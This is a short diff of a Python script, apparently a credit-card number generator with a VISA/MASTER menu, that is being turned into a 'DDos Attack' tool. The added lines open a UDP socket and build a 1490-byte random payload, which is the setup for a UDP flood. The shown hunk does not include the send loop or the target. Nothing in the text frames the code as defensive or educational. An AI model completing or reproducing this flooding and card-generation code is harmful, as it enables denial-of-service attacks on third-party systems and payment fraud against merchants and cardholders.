@@ -18,10 +18,17 @@ from datetime import date
 #variaveis
 con = bin = 0
 data = date.today().year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+
 #layout
-os.system( " clear " )
 print('-' *43)
-print(' Generator CCs  v0.1')
+os.system("figlet DDos Attack")
 print('-' *43)
 print(' [1] - VISA')         
 print(' [2] - MASTER')
